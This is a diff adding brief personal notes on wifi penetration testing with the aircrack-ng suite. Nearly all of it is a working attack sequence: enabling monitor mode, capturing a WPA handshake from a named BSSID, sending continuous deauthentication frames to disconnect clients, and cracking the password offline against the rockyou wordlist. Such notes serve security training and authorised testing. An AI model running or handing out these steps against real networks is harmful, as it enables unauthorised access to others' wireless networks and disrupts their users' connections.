@@ -1,0 +1,35 @@
+wifi penetration testing 
+
+Turn on monitor mode:
+
+check : ip dev, iwconfig
+
+airmon-ng start wlan0
+
+it start the monitor mode in adaptor
+
+
+------------------------------------------------------------
+            Stage - 2
+
+command : airodump-ng wlan0
+
+it dump the wireless information like bssid, channels etc.
+
+choose the target and collect the bssid , channel , essid store them 
+
+example command:
+
+airodump-ng -w wificapture -c 3 --bssid A8:42:A1:68:48:34 wlan0
+
+This command tries to capture the handshake 
+
+
+aireplay-ng --deauth 0 -a A8:42:A1:68:48:34 wlan0
+
+This command deauth the existing user to Access point
+
+aircrack-ng wificapture.cap -w /usr/share/wordlists/rockyou.txt
+
+This command is used to crack the pass offline
+
